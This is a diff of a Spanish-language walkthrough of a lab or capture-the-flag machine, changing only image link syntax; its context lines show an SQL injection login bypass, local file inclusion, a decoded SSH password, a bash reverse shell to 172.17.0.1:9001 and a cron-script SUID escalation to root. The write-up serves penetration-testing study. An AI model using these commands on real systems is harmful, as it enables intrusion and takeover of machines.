@@ -6,7 +6,7 @@
 
 Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:
 
-![Pasted image 20260801170301.png](<../../../.gitbook/assets/Pasted image 20260801170301.png>)
+![[Pasted image 20260801170301.png]]
 
 **Servicios identificados:**
 
@@ -21,7 +21,7 @@ Realizamos un escaneo de puertos inicial con nmap para identificar los servicios
 
 Accedemos al servidor web en el puerto 80 y nos encontramos con un panel de login:
 
-![Pasted image 20260801170331.png](<../../../.gitbook/assets/Pasted image 20260801170331.png>)
+![[Pasted image 20260801170331.png]]
 
 ***
 
@@ -35,12 +35,12 @@ Intentamos inyección SQL en el formulario de login. Probamos en el campo del us
 'OR '1'='1 -- -
 ```
 
-![Pasted image 20260804221003.png](<../../../.gitbook/assets/Pasted image 20260804221003.png>)
+![[Pasted image 20260804221003.png]]
 
 * **Resultado:** Logramos evadir la autenticación y acceder al panel de administración.
 * **Nota en el Código:** Al inspeccionar el código fuente del panel, encontramos una nota comentada:
 
-![Pasted image 20260804221029.png](<../../../.gitbook/assets/Pasted image 20260804221029.png>)
+![[Pasted image 20260804221029.png]]
 
 #### Explotación de LFI (Local File Inclusion)
 
@@ -52,7 +52,7 @@ http://172.17.0.2/index.php?page=
 
 Aprovechamos este parámetro para leer archivos del sistema. Si solicitamos la ruta logs/logs.txt, obtenemos el registro de eventos:
 
-![Pasted image 20260804222040.png](<../../../.gitbook/assets/Pasted image 20260804222040.png>)
+![[Pasted image 20260804222040.png]]
 
 * **Hallazgo Clave:** Identificamos un intento fallido de conexión SSH para el usuario albert que expone su contraseña codificada en base64: `NGxiM3J0MTIz`.
 
@@ -65,7 +65,7 @@ echo -n 'NGxiM3J0MTIz' | base64 -d
 ssh albert@172.17.0.2
 ```
 
-![Pasted image 20260804224850.png](<../../../.gitbook/assets/Pasted image 20260804224850.png>)
+![[Pasted image 20260804224850.png]]
 
 * **Acceso:** Obtenemos una shell inicial en el sistema como el usuario albert.
 
@@ -112,7 +112,7 @@ ps aux
 nc -U /run/bypassme.sock
 ```
 
-![Pasted image 20260804232943.png](<../../../.gitbook/assets/Pasted image 20260804232943.png>)
+![[Pasted image 20260804232943.png]]
 
 * **Resultado:** La consola del socket nos proporciona ejecución de comandos bajo la identidad del usuario conx.
 
@@ -128,7 +128,7 @@ Y enviamos una reverse shell a través de la sesión activa en el socket Unix:
 bash -i >& /dev/tcp/172.17.0.1/9001 0>&1
 ```
 
-![Pasted image 20260804233007.png](<../../../.gitbook/assets/Pasted image 20260804233007.png>)
+![[Pasted image 20260804233007.png]]
 
 #### Abuso de Tarea Cron (root)
 
@@ -147,7 +147,7 @@ echo "chmod u+s /bin/bash" > /var/backups/backup.sh
 
 Esperamos unos minutos a que se ejecute la tarea programada:
 
-![Pasted image 20260804233517.png](<../../../.gitbook/assets/Pasted image 20260804233517.png>)
+![[Pasted image 20260804233517.png]]
 
 Ejecutamos bash preservando los privilegios de root para obtener la consola final:
 
@@ -155,7 +155,7 @@ Ejecutamos bash preservando los privilegios de root para obtener la consola fina
 /bin/bash -p
 ```
 
-![Pasted image 20260804234056.png](<../../../.gitbook/assets/Pasted image 20260804234056.png>)
+![[Pasted image 20260804234056.png]]
 
 ***
 
